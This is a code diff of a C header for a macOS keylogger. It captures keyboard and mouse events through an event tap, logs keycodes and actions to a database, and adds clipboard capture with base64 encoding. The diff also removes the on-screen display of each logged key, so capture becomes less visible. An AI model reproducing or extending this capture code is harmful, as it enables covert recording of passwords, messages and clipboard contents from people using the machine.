@@ -1,21 +1,95 @@
 #pragma once
+#include <assert.h>
+#include <ctype.h>
+#include <inttypes.h>
 #include <signal.h>
-//#include "print.h"
+#include <stdint.h>
+#include <stdint.h>
+#include <stdio.h>
 #include <stdlib.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/time.h>
+#include <unistd.h>
 /**********************************/
 #include "keylogger.h"
+#include "pbpaste.h"
 /**********************************/
+typedef struct ctx_t              ctx_t;
+typedef struct mouse_location_t   mouse_location_t;
+typedef struct pids_t             pids_t;
+typedef struct db_stats_t         db_stats_t;
+typedef struct updates_t          updates_t;
+typedef struct windows_t          windows_t;
+typedef struct focus_t            focus_t;
+typedef struct event_t            event_t;
+typedef struct displays_t         displays_t;
+typedef struct clipboard_t        clipboard_t;
+/**********************************/
+struct ctx_t {
+  //////////////////////////////////////////
+  enum {
+    THREAD_RECEIVER,
+    THREADS_QTY,
+  }             worker_thread_type_id_t;
+  //////////////////////////////////////////
+  unsigned long last_event_ts;
+  struct clipboard_t {
+    char              *contents, *b64_encoded;
+    size_t            contents_size, b64_encoded_size;
+    unsigned long     last_update_ts;
+    clipboard_event_t event;
+  } clipboard_t;
+  struct displays_t {
+    int           qty;
+    unsigned long last_update_ts;
+  } displays_t;
+  struct event_t {
+    int qty;
+  } event_t;
+  struct focus_t {
+    int           qty, key_code, key_action;
+    unsigned long last_update_ts;
+  } focus_t;
+  struct db_stats_t {
+    size_t        table_size, rows_qty;
+    unsigned long last_update_ts;
+  } db_stats_t;
+  struct windows_t {
+    int           qty;
+    int           pixels_x, pixels_y;
+    unsigned long last_update_ts;
+  } windows_t;
+  struct mouse_location_t {
+    int           x, y;
+    unsigned long last_update_ts;
+  }                mouse_location_t;
+  //////////////////////////////////////////
+  mouse_location_t mouse_location;
+  windows_t        windows;
+  event_t          event;
+  db_stats_t       db_stats;
+  clipboard_t      clipboard;
+  //////////////////////////////////////////
+};
+static ctx_t ctx = {
+  .windows        = {
+    .qty          = 0,
+  },
+  .mouse_location = {
+    .x            = 0, .y = 0,
+  },
+};
 static bool IsMouseEvent(CGEventType type);
 
-static volatile CFArrayRef windowList;
-volatile unsigned int      windows_qty    = 0;
-static volatile CGPoint    mouse_location = { .x = 0, .y = 0, };
-volatile unsigned long
-                           events_qty = 0,
-  mouse_events_qty                    = 0,
-  kb_events_qty                       = 0
+static CFArrayRef windowList;
+unsigned int      windows_qty    = 0;
+static CGPoint    mouse_location = { .x = 0, .y = 0, };
+unsigned long
+                  events_qty = 0,
+  mouse_events_qty           = 0,
+  kb_events_qty              = 0
 ;
-static bool was_icanon = false, exited = false;
 
 
 /**********************************/
@@ -36,28 +110,6 @@ static bool IsMouseEvent(CGEventType type) {
          );
 }
 
-
-void __at_exit(void){
-  if (exited) {
-    return(0);
-  }
-  exited = true;
-  bool ic = seticanon(was_icanon, true);
-  fprintf(stdout, "%s", AC_SHOW_CURSOR);
-  if (false) {
-    fprintf(stdout, "%s", AC_RESTORE_PALETTE);
-  }
-  if (false) {
-    fprintf(stdout, "%s", AC_ALT_SCREEN_OFF);
-  }
-  exit(0);
-}
-
-#define INIT_KEYLOGGER_STATS()    { do {                                                             \
-                                      if (false) fprintf(stdout, "%s", AC_SAVE_PALETTE);             \
-                                      if (false) fprintf(stdout, "%s", AC_ALT_SCREEN_ON);            \
-                                      was_icanon = (seticanon(false, false) == true) ? true : false; \
-                                    } while (0); }
 
 /**********************************/
 static volatile CGEventMask mouse_and_kb_events = (
@@ -95,7 +147,6 @@ static int setup_event_tap(){
     fprintf(stderr, "ERROR: Unable to create keyboard event tap.\n");
     return(1);
   }
-
   CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event_tap, 0);
 
   CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
@@ -106,11 +157,6 @@ static int setup_event_tap(){
 
 /**********************************/
 int init(){
-  signal(SIGINT, __at_exit);
-  signal(SIGTERM, __at_exit);
-  signal(SIGQUIT, __at_exit);
-  atexit(__at_exit);
-  INIT_KEYLOGGER_STATS();
   assert(keylogger_init_db() == 0);
   assert(keylogger_create_db() == 0);
   mouse_location = CGEventGetLocation(event_handler);
@@ -133,32 +179,16 @@ CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
   ;
 
   input_type = ((is_mouse) ? "mouse" : ((is_keyboard) ? ("keyboard") : ("UNKNOWN")));
-  action     = ((key_up) ? "UP" : ((key_down) ? "DOWN" : "UNKNOWN"));
+  action     = ((key_up) ? "UP" : ((key_down) ? "DOWN" : is_mouse ? "MOUSE" : "UNKNOWN"));
 
   if (is_mouse) {
     mouse_location = CGEventGetLocation(event);
     keyCode        = (CGKeyCode)CGEventGetIntegerValueField(event, kCGMouseEventButtonNumber) + 1;
+    ckc            = "MOUSE";
   }else{
     keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
     ckc     = convertKeyboardCode(keyCode);
   }
-
-  fprintf(stdout, "%s", AC_CLS);
-  fprintf(stdout,
-          "\n\t  | ts     : %lu"
-          "\n\t  | keycode: %d"
-          "\n\t  | action:  %s"
-          "\n\t  | key:     %s"
-          "\n\t  | action:  %s"
-          "\n\t  | ts:"
-          "\n",
-          (size_t)TS,
-          (int)keyCode,
-          (char *)action,
-          (char *)ckc,
-          (char *)action
-          );
-
 
   keylogger_insert_db_row(&(logged_key_event_t){
     .ts         = (uint64_t)TS,
